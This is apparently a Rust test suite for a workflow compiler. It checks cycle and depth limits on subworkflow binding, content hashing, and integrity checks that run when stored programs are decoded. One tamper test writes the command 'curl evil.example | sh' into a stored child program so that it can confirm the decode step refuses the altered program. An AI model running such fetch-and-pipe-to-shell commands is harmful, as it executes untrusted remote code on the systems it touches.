//! A subworkflow's child program is compiled and BOUND at the parent's CHECK.
//!
//! What these cells refuse, each by name: a cyclic invocation chain
//! (`subworkflow_cycle`), a chain deeper than `MAX_SUBWORKFLOW_DEPTH`
//! (`subworkflow_depth_exceeded`, at the compile and at the decode of a stored
//! program), a pack no library root resolves
//! (`subworkflow_pack_unresolved`), a bound child program this node refuses
//! (named through the invoking stage), and a DECODED parent whose embedded
//! child does not re-derive the hash it is bound under (`bound_child_program_mismatch`).
//! And what they admit: a chain exactly `MAX_SUBWORKFLOW_DEPTH` deep, and a parent
//! whose `program_hash` moves when — and only because — its child's bytes moved.
//!
//! The oracle for "which bytes were bound" is the pack FILE: each cell writes the
//! library with `std::fs` and compares against an independent compile of those bytes.

use std::fmt::Write as _;
use std::path::PathBuf;

use kata_program::execution_program::{
    ExecutionProgram, MAX_SUBWORKFLOW_DEPTH, compile_execution_program_from_file,
    compile_starlark_execution_program, rederive_program_hash,
};

const SHELL_CHILD: &str = "only = stage(id = \"only\", agent = \"shell\", run = \":\")\nworkflow(\"child-wf\", root = only)\n";

fn parent_of(pack: &str) -> String {
    format!(
        "run_child = subworkflow(id = \"run_child\", pack = \"{pack}\")\n\
         workflow(\"parent-wf\", root = run_child)\n"
    )
}

fn library(packs: &[(&str, String)]) -> tempfile::TempDir {
    let dir = tempfile::tempdir().expect("library tempdir");
    for (name, source) in packs {
        std::fs::write(dir.path().join(format!("{name}.star")), source).expect("write pack");
    }
    dir
}

fn roots(dir: &tempfile::TempDir) -> Vec<PathBuf> {
    vec![dir.path().to_path_buf()]
}

fn compile_parent(
    dir: &tempfile::TempDir,
    source: &str,
) -> kata_types::KataResult<ExecutionProgram> {
    compile_starlark_execution_program(source, "parent.star", &roots(dir))
}

fn bound_child(program: &ExecutionProgram) -> &ExecutionProgram {
    program.stages[&kata_types::workflow::StageId("run_child".into())]
        .subworkflow
        .as_ref()
        .expect("run_child is a subworkflow")
        .bound
        .program()
}

/// The parent embeds EXACTLY the child an independent compile of the pack file
/// yields, and its own hash moves when the child's bytes move — the fold the
/// "frozen at admission" rule needs.
#[test]
fn a_parent_binds_its_child_and_its_hash_folds_the_childs() {
    let dir = library(&[("child", SHELL_CHILD.to_owned())]);
    let parent = compile_parent(&dir, &parent_of("child")).expect("the parent compiles");
    let independent =
        compile_execution_program_from_file(&dir.path().join("child.star"), &roots(&dir))
            .expect("the child compiles on its own");
    assert_eq!(bound_child(&parent), &independent);

    // No machine fact: the same packs under a DIFFERENT library directory bind the
    // same child and produce the same parent.
    let elsewhere = library(&[("child", SHELL_CHILD.to_owned())]);
    assert_ne!(elsewhere.path(), dir.path());
    let relocated = compile_parent(&elsewhere, &parent_of("child")).expect("relocated compiles");
    assert_eq!(
        relocated.program_hash, parent.program_hash,
        "the library root's location must not enter the parent's identity"
    );

    std::fs::write(
        dir.path().join("child.star"),
        SHELL_CHILD.replace("run = \":\"", "run = \"true\""),
    )
    .expect("edit the child");
    let edited = compile_parent(&dir, &parent_of("child")).expect("the parent recompiles");
    assert_ne!(
        bound_child(&edited).program_hash,
        bound_child(&parent).program_hash,
        "non-vacuity: the child's bytes changed"
    );
    assert_ne!(
        edited.program_hash, parent.program_hash,
        "an edited child must rotate its parent's program hash"
    );
}

/// A child that invokes its own ancestor is refused at check, naming the chain; so
/// is a pack that invokes itself.
#[test]
fn a_cyclic_subworkflow_chain_is_refused_naming_the_chain() {
    let dir = library(&[
        ("a", parent_of("b").replace("parent-wf", "wf-a")),
        ("b", parent_of("a").replace("parent-wf", "wf-b")),
        (
            "selfish",
            parent_of("selfish").replace("parent-wf", "wf-selfish"),
        ),
    ]);
    let error = compile_execution_program_from_file(&dir.path().join("a.star"), &roots(&dir))
        .expect_err("a -> b -> a must be refused")
        .to_string();
    assert!(
        error.contains("subworkflow_cycle") && error.contains("wf-a -> b -> a"),
        "{error}"
    );

    let error = compile_execution_program_from_file(&dir.path().join("selfish.star"), &roots(&dir))
        .expect_err("a self-invoking pack must be refused")
        .to_string();
    assert!(
        error.contains("subworkflow_cycle") && error.contains("wf-selfish -> selfish"),
        "{error}"
    );
}

/// A cycle is refused at its FIRST repeated program, identified by its BYTES: an inline
/// root (no file, so no path to repeat) whose child pack has the root's own source bytes is
/// already a cycle — the same bytes resolve the same children through the same roots — and
/// the chain names the root and the child once, `parent-wf -> a`.
///
/// Why the source-hash half of the check is kept although the path half alone would also
/// terminate (one level later, `parent-wf -> a -> a`): program identity in this IR is
/// content, so the repeated program is the byte-identical one, and the diagnosis should
/// name the first repeat rather than the second.
///
/// **Would red if:** the cycle check compared paths only: the chain
/// names `a` twice.
#[test]
fn a_child_with_the_inline_roots_own_bytes_is_a_cycle_at_the_first_repeat() {
    let root = parent_of("a");
    let dir = library(&[("a", root.clone())]);
    let error = compile_parent(&dir, &root)
        .expect_err("the root's own bytes, re-entered, are a cycle")
        .to_string();
    assert!(
        error.contains("subworkflow_cycle")
            && error.contains("invocation chain parent-wf -> a. ")
            && !error.contains("-> a -> a"),
        "{error}"
    );
}

/// A chain of `MAX_SUBWORKFLOW_DEPTH` nested invocations is admitted; one more is
/// refused by name.
#[test]
fn subworkflow_depth_is_capped_at_the_maximum() {
    // p0 -> p1 -> ... -> p{n}, where p{n} is a shell leaf. p0 is the root (depth 0),
    // so the leaf sits at depth n.
    let chain = |n: usize| {
        let mut packs: Vec<(String, String)> = (0..n)
            .map(|i| {
                (
                    format!("p{i}"),
                    parent_of(&format!("p{}", i + 1)).replace("parent-wf", &format!("wf-p{i}")),
                )
            })
            .collect();
        packs.push((
            format!("p{n}"),
            SHELL_CHILD.replace("child-wf", &format!("wf-p{n}")),
        ));
        packs
    };
    let as_refs = |packs: &[(String, String)]| {
        library(
            &packs
                .iter()
                .map(|(name, source)| (name.as_str(), source.clone()))
                .collect::<Vec<_>>(),
        )
    };

    let at_limit = as_refs(&chain(MAX_SUBWORKFLOW_DEPTH));
    compile_execution_program_from_file(&at_limit.path().join("p0.star"), &roots(&at_limit))
        .expect("a chain exactly MAX_SUBWORKFLOW_DEPTH deep is admitted");

    let over = as_refs(&chain(MAX_SUBWORKFLOW_DEPTH + 1));
    let error = compile_execution_program_from_file(&over.path().join("p0.star"), &roots(&over))
        .expect_err("one level deeper is refused")
        .to_string();
    assert!(
        error.contains("subworkflow_depth_exceeded")
            && error.contains(&format!("depth {}", MAX_SUBWORKFLOW_DEPTH + 1)),
        "{error}"
    );
}

/// A program's STORED form: its own fields (the table entry it would be as a child) and
/// its `bound_children` table.
fn stored_parts(
    program: &ExecutionProgram,
) -> (
    serde_json::Value,
    serde_json::Map<String, serde_json::Value>,
) {
    let mut entry = serde_json::to_value(program).expect("serialize");
    let table = entry
        .as_object_mut()
        .expect("a program stores as an object")
        .remove("bound_children")
        .map(|table| table.as_object().expect("the table is a map").clone())
        .unwrap_or_default();
    (entry, table)
}

/// A stored root whose subworkflow stages reference `children` by hash, each stage named
/// as its pair says, with the one table holding every child's closure — bytes no compile
/// writes when the nesting is deeper than the compile admits. The root is a real compile
/// of a wrapper of shell leaves, re-pointed at the children: decode re-derives a CHILD's
/// hash from its body, never the root's own.
fn stored_wrapper(children: &[(&str, &ExecutionProgram)]) -> serde_json::Value {
    let mut source = String::new();
    for (stage, _) in children {
        writeln!(
            source,
            "{stage} = subworkflow(id = \"{stage}\", pack = \"leaf\")"
        )
        .expect("a String accepts a write");
    }
    let roots = children
        .iter()
        .map(|(stage, _)| *stage)
        .collect::<Vec<_>>()
        .join(", ");
    writeln!(source, "workflow(\"wrapper\", root = [{roots}])").expect("a String accepts a write");
    let dir = library(&[("leaf", SHELL_CHILD.to_owned())]);
    let wrapper = compile_parent(&dir, &source).expect("the wrapper of shell leaves compiles");
    let mut stored = serde_json::to_value(&wrapper).expect("serialize");
    let mut table = serde_json::Map::new();
    for (stage, child) in children {
        stored["stages"][*stage]["subworkflow"]["bound"] =
            serde_json::json!({ "program_hash": child.program_hash });
        let (entry, closure) = stored_parts(child);
        table.insert(child.program_hash.to_string(), entry);
        table.extend(closure);
    }
    stored["bound_children"] = serde_json::Value::Object(table);
    stored
}

/// The DECODE door refuses what the compile refuses: a stored program nesting deeper than
/// `MAX_SUBWORKFLOW_DEPTH` is `subworkflow_depth_exceeded`, so the stored form cannot hold
/// a tree the CHECK would never bind — and the runtime, which spawns exactly the bound
/// bytes, never spawns one. `x` is a chain `MAX_SUBWORKFLOW_DEPTH - 1` invocations deep
/// below its own root, `y` invokes `x`. A stored wrapper invoking `x` nests to exactly the
/// maximum and decodes; one invoking `y` nests one deeper and is refused.
///
/// The second refusal is the SHARED child: a wrapper invoking `x` directly (decoded first,
/// at depth 1) AND `y` (which reaches the same `x` at depth 2). The decode builds each
/// distinct child once, so a depth judged only where a child is first decoded admits it.
///
/// **Would red if:** the decode applied no depth bound (both refusals decode), or judged
/// only a child's first decode (the shared-child refusal decodes).
#[test]
fn the_decode_door_refuses_a_stored_program_nested_deeper_than_the_compile_admits() {
    let mut packs: Vec<(String, String)> = (1..MAX_SUBWORKFLOW_DEPTH)
        .map(|i| {
            (
                format!("q{i}"),
                parent_of(&format!("q{}", i + 1)).replace("parent-wf", &format!("wf-q{i}")),
            )
        })
        .collect();
    packs.push((
        format!("q{MAX_SUBWORKFLOW_DEPTH}"),
        SHELL_CHILD.replace("child-wf", &format!("wf-q{MAX_SUBWORKFLOW_DEPTH}")),
    ));
    packs.push(("y".to_owned(), parent_of("q1").replace("parent-wf", "wf-y")));
    let dir = library(
        &packs
            .iter()
            .map(|(name, source)| (name.as_str(), source.clone()))
            .collect::<Vec<_>>(),
    );
    let x = compile_execution_program_from_file(&dir.path().join("q1.star"), &roots(&dir))
        .expect("x compiles: its leaf sits MAX_SUBWORKFLOW_DEPTH - 1 below it");
    let y = compile_execution_program_from_file(&dir.path().join("y.star"), &roots(&dir))
        .expect("y compiles: its leaf sits exactly MAX_SUBWORKFLOW_DEPTH below it");

    let at_limit: ExecutionProgram = serde_json::from_value(stored_wrapper(&[("run_x", &x)]))
        .expect("a stored program nested exactly MAX_SUBWORKFLOW_DEPTH deep decodes");
    assert_eq!(
        at_limit.bound_child_programs().count(),
        MAX_SUBWORKFLOW_DEPTH,
        "premise: the wrapper binds x and its whole chain"
    );

    for (why, children) in [
        ("one level too deep", vec![("run_y", &y)]),
        (
            "a shared child reached one level too deep",
            vec![("a_x", &x), ("b_y", &y)],
        ),
    ] {
        let error = serde_json::from_value::<ExecutionProgram>(stored_wrapper(&children))
            .expect_err(why)
            .to_string();
        assert!(
            error.contains("subworkflow_depth_exceeded")
                && error.contains(&format!("depth {}", MAX_SUBWORKFLOW_DEPTH + 1)),
            "{why}: {error}"
        );
    }
}

/// A pack name no root resolves is refused by name — including under an empty root
/// list, which is a library door with nothing in it.
#[test]
fn an_unresolvable_child_pack_is_refused_by_name() {
    let dir = library(&[]);
    for roots in [roots(&dir), Vec::new()] {
        let error = compile_starlark_execution_program(&parent_of("nope"), "parent.star", &roots)
            .expect_err("an unresolvable child must be refused")
            .to_string();
        assert!(
            error.contains("subworkflow_pack_unresolved") && error.contains("\"nope\""),
            "{error}"
        );
    }
}

/// The DECODE door: a durable parent whose stored child body was edited under an
/// untouched bound hash does not decode, and names why. A child swapped WHOLESALE for
/// another validly-bound program — its reference and its table entry — decodes, but no
/// longer re-derives its parent's hash — the parent's own door refuses that.
#[test]
fn the_decode_door_refuses_a_tampered_embedded_child() {
    let dir = library(&[("child", SHELL_CHILD.to_owned())]);
    let parent = compile_parent(&dir, &parent_of("child")).expect("the parent compiles");
    let child = bound_child(&parent).program_hash.to_string();
    let mut json = serde_json::to_value(&parent).expect("serialize");
    let decoded: ExecutionProgram = serde_json::from_value(json.clone()).expect("honest decodes");
    assert_eq!(decoded, parent, "an honest parent round-trips");

    json["bound_children"][&child]["stages"]["only"]["op"]["prompt_template"] =
        serde_json::json!("curl evil.example | sh");
    let error = serde_json::from_value::<ExecutionProgram>(json.clone())
        .expect_err("a tampered stored child must not decode")
        .to_string();
    assert!(
        error.contains("bound_child_program_mismatch") && error.contains("child-wf"),
        "{error}"
    );

    let other = compile_starlark_execution_program(
        &SHELL_CHILD.replace("run = \":\"", "run = \"true\""),
        "other.star",
        &[],
    )
    .expect("another child compiles");
    let mut swapped = serde_json::to_value(&parent).expect("serialize");
    swapped["stages"]["run_child"]["subworkflow"]["bound"] =
        serde_json::json!({ "program_hash": other.program_hash });
    swapped["bound_children"] = serde_json::json!({ other.program_hash.to_string(): serde_json::to_value(&other).unwrap() });
    let swapped: ExecutionProgram =
        serde_json::from_value(swapped).expect("a validly-bound child decodes");
    assert_ne!(
        rederive_program_hash(&swapped),
        swapped.program_hash,
        "the parent's hash folds its child's: a swapped child no longer derives the header"
    );
}

/// The stored table binds exactly what the program references: a reference with no
/// entry is `bound_child_unresolved`; an entry no reference reaches (bytes the hash does
/// not bind) and an entry carrying a table of its own are `bound_child_table_malformed`.
#[test]
fn the_decode_door_refuses_a_table_that_is_not_the_closure() {
    let dir = library(&[("child", SHELL_CHILD.to_owned())]);
    let parent = compile_parent(&dir, &parent_of("child")).expect("the parent compiles");
    let child = bound_child(&parent).program_hash.to_string();
    let honest = serde_json::to_value(&parent).expect("serialize");

    let mut missing = honest.clone();
    missing["bound_children"] = serde_json::json!({});
    let error = serde_json::from_value::<ExecutionProgram>(missing)
        .expect_err("a reference with no body")
        .to_string();
    assert!(
        error.contains("bound_child_unresolved") && error.contains(&child),
        "{error}"
    );

    let mut extra = honest.clone();
    extra["bound_children"]["00".repeat(32)] = honest["bound_children"][&child].clone();
    let error = serde_json::from_value::<ExecutionProgram>(extra)
        .expect_err("an unreferenced body")
        .to_string();
    assert!(
        error.contains("bound_child_table_malformed") && error.contains("reached by no reference"),
        "{error}"
    );

    let mut nested = honest;
    nested["bound_children"][&child]["bound_children"] = serde_json::json!({});
    let error = serde_json::from_value::<ExecutionProgram>(nested)
        .expect_err("an entry with a table of its own")
        .to_string();
    assert!(
        error.contains("bound_child_table_malformed") && error.contains("table of its own"),
        "{error}"
    );
}

/// A table entry SWAPPED for another validly-bound child — its body a whole, honest program
/// that re-derives its OWN hash, keyed under the hash the parent references — is refused
/// `bound_child_program_mismatch`: a reference resolves only to the body its hash names.
/// Distinct from the tampered-body case above, whose body re-derives no hash at all.
///
/// **Would red if:** the decode's resolver trusted the table key and checked only that the
/// body re-derives its own carried hash; the parent would then decode with the OTHER child
/// bound under its reference.
#[test]
fn a_table_entry_swapped_for_another_valid_child_is_refused() {
    let dir = library(&[("child", SHELL_CHILD.to_owned())]);
    let parent = compile_parent(&dir, &parent_of("child")).expect("the parent compiles");
    let child = bound_child(&parent).program_hash;
    let other = compile_starlark_execution_program(
        &SHELL_CHILD.replace("run = \":\"", "run = \"true\""),
        "other.star",
        &[],
    )
    .expect("another child compiles");
    assert_ne!(other.program_hash, child, "the premise: another program");
    assert_eq!(
        rederive_program_hash(&other),
        other.program_hash,
        "the premise: the swapped-in body is honest about its own hash"
    );

    let mut swapped = serde_json::to_value(&parent).expect("serialize");
    swapped["bound_children"][child.to_string()] =
        serde_json::to_value(&other).expect("serialize the other child");
    let error = serde_json::from_value::<ExecutionProgram>(swapped)
        .expect_err("a reference must not resolve to another child's body")
        .to_string();
    assert!(
        error.contains("bound_child_program_mismatch")
            && error.contains(&child.to_string())
            && error.contains(&other.program_hash.to_string()),
        "{error}"
    );
}

/// A WIDE tree binds and stores each distinct child ONCE. Pack `lK` invokes `l(K+1)` three
/// times, six levels deep: 3 + 9 + … + 729 = 1092 invocations of 6 distinct children.
/// The stored program's table holds exactly those 6 bodies, the program's JSON carries 6
/// program bodies in all (the root's and the table's), and every invocation of one child
/// shares one allocation. The review measured 1092 embedded bodies and 3.3 MB for this
/// tree before.
///
/// **Would red if:** the binder compiled a child per invocation (1092 allocations; the
/// sharing assertion fails), or the stored form embedded a body per reference.
#[test]
fn a_wide_subworkflow_tree_binds_and_stores_each_distinct_child_once() {
    const FAN_OUT: usize = 3;
    const LEVELS: usize = 6;
    let invoking = |next: usize| {
        let mut stages = String::new();
        for i in 0..FAN_OUT {
            writeln!(
                stages,
                "s{i} = subworkflow(id = \"s{i}\", pack = \"l{next}\")"
            )
            .expect("a String accepts a write");
        }
        let roots = (0..FAN_OUT)
            .map(|i| format!("s{i}"))
            .collect::<Vec<_>>()
            .join(", ");
        format!("{stages}workflow(\"wf-l{}\", root = [{roots}])\n", next - 1)
    };
    let mut packs = (2..=LEVELS)
        .map(|k| (format!("l{}", k - 1), invoking(k)))
        .collect::<Vec<_>>();
    packs.push((format!("l{LEVELS}"), SHELL_CHILD.to_owned()));
    let dir = library(
        &packs
            .iter()
            .map(|(n, s)| (n.as_str(), s.clone()))
            .collect::<Vec<_>>(),
    );

    let started = std::time::Instant::now();
    let program = compile_parent(&dir, &invoking(1)).expect("the wide tree binds");
    let compiled_in = started.elapsed();

    let json = serde_json::to_value(&program).expect("serialize");
    let table = json["bound_children"]
        .as_object()
        .expect("the stored table");
    assert_eq!(table.len(), LEVELS, "one stored body per DISTINCT child");
    let bytes = serde_json::to_vec(&program).expect("serialize");
    let bodies = bytes
        .windows(b"\"workflow_class\"".len())
        .filter(|window| *window == b"\"workflow_class\"")
        .count();
    assert_eq!(
        bodies,
        LEVELS + 1,
        "the root's body and one per distinct child"
    );

    let specs = |p: &ExecutionProgram| {
        p.stages
            .values()
            .filter_map(|stage| stage.subworkflow.as_ref())
            .map(|spec| std::ptr::from_ref::<ExecutionProgram>(spec.bound.program()))
            .collect::<Vec<_>>()
    };
    let top = specs(&program);
    assert_eq!(top.len(), FAN_OUT);
    assert!(
        top.iter().all(|p| std::ptr::eq(*p, top[0])),
        "every invocation of one child shares ONE allocation"
    );

    let decoded: ExecutionProgram = serde_json::from_slice(&bytes).expect("it decodes");
    assert_eq!(decoded, program, "and round-trips");
    let decoded_top = specs(&decoded);
    assert!(
        decoded_top.iter().all(|p| std::ptr::eq(*p, decoded_top[0])),
        "the decode shares one allocation per distinct child too"
    );
    eprintln!(
        "wide tree: {FAN_OUT}^1..{FAN_OUT}^{LEVELS} invocations, compiled in {compiled_in:?}, \
         stored in {} bytes",
        bytes.len()
    );
}

/// The `oci` judgement over a tree as wide
/// and as deep as a program can bind: every pack invokes the next 16 times, down the full
/// `MAX_SUBWORKFLOW_DEPTH`. That is 16 + 16^2 + … + 16^8 ≈ 4.6e9 invocations of 8 distinct
/// children, judged at BOTH doors — the production compile (CHECK) and the public function
/// the recovery door calls on the compiled program.
///
/// **Would red if:** the judgement walked every invocation instead of every distinct
/// child. The review measured 1.83 s for 8^7 ≈ 2.1e6 invocations; 4.6e9 cannot finish
/// inside the harness's per-test termination, so the red is that termination. No timing
/// is asserted: this cell's claim is that the walk is bounded by the DISTINCT children.
#[test]
fn the_oci_judgement_of_a_maximally_wide_and_deep_tree_is_bounded_by_its_distinct_children() {
    const FAN_OUT: usize = 16;
    let invoking = |next: usize| {
        let mut stages = String::new();
        for i in 0..FAN_OUT {
            writeln!(
                stages,
                "s{i} = subworkflow(id = \"s{i}\", pack = \"l{next}\")"
            )
            .expect("a String accepts a write");
        }
        let roots = (0..FAN_OUT)
            .map(|i| format!("s{i}"))
            .collect::<Vec<_>>()
            .join(", ");
        format!("{stages}workflow(\"wf-l{}\", root = [{roots}])\n", next - 1)
    };
    let mut packs = (2..=MAX_SUBWORKFLOW_DEPTH)
        .map(|k| (format!("l{}", k - 1), invoking(k)))
        .collect::<Vec<_>>();
    packs.push((format!("l{MAX_SUBWORKFLOW_DEPTH}"), SHELL_CHILD.to_owned()));
    let dir = library(
        &packs
            .iter()
            .map(|(n, s)| (n.as_str(), s.clone()))
            .collect::<Vec<_>>(),
    );

    kata_types::node_profile::mark_node_installed();
    let program = compile_parent(&dir, &invoking(1))
        .expect("the CHECK door admits a maximal tree of shell leaves under oci");
    kata_program::execution_program::refuse_program_at_check_or_recovery(
        &program,
        &mut std::collections::BTreeSet::new(),
    )
    .expect("the recovery door admits it too");
}

/// A MODEL stage inside a bound child is refused at CHECK when the node
/// declares no adapter for it, and the refusal names the CHILD's stage through
/// the stage that invoked it. (The subworkflow stage is a node-fact refusal in
/// its own right too; this cell is about which stage the diagnosis names.)
#[test]
fn a_bound_child_model_stage_refuses_the_parent_at_check_when_undeclared() {
    let dir = library(&[(
        "child",
        "only = stage(id = \"only\", prompt = \"model work\")\nworkflow(\"model-child\", root = only)\n"
            .to_owned(),
    )]);
    kata_types::node_profile::mark_node_installed();
    let refused = compile_parent(&dir, &parent_of("child"));
    kata_types::node_profile::mark_node_installed();
    let error = refused
        .expect_err("the parent must be refused — the node declares no adapter")
        .to_string();
    assert!(
        error.contains("stage \"run_child\" invokes subworkflow pack \"child\"")
            && error.contains("stage \"only\""),
        "the refusal names the invoking stage and the child's model stage: {error}"
    );
    // NON-VACUITY: a node that declares the adapter admits the same parent —
    // the refusal above is the node's fact, not the binding shape.
    let agents = std::collections::BTreeMap::from([(
        "any".to_owned(),
        kata_program::test_harness::rig_agent_backend_config(),
    )]);
    kata_types::node_profile::install_node_agents(agents);
    compile_parent(&dir, &parent_of("child"))
        .expect("non-vacuity: the same parent compiles once the node declares the adapter");
}

/// A subworkflow stage LOWERS to an `Invoke` naming the bound child's hash and the
/// hash of its CANONICAL params: authored key order does not rotate it, a changed
/// value does.
#[test]
fn a_subworkflow_lowers_to_an_invoke_over_its_bound_child_and_canonical_params() {
    use kata_program::execution_program::lower_stage_operation;
    use kata_types::execution_contract::RuntimeOperation;

    let dir = library(&[("child", SHELL_CHILD.to_owned())]);
    let invoke = |params: &str| {
        let program = compile_parent(
            &dir,
            &format!(
                "run_child = subworkflow(id = \"run_child\", pack = \"child\", params = {params})\n\
                 workflow(\"parent-wf\", root = run_child)\n"
            ),
        )
        .expect("the parent compiles");
        let lowered =
            lower_stage_operation(&program, &kata_types::workflow::StageId("run_child".into()))
                .expect("a subworkflow stage lowers");
        match lowered.contract.operation {
            RuntimeOperation::Invoke {
                program: child,
                params_hash,
            } => {
                assert_eq!(child, bound_child(&program).program_hash);
                params_hash
            }
            other => panic!("a subworkflow lowers to an Invoke, got {other:?}"),
        }
    };
    let forward = invoke("{\"a\": 1, \"b\": 2}");
    assert_eq!(
        forward,
        invoke("{\"b\": 2, \"a\": 1}"),
        "key order is not identity"
    );
    assert_ne!(
        forward,
        invoke("{\"a\": 1, \"b\": 3}"),
        "a changed value is"
    );
}
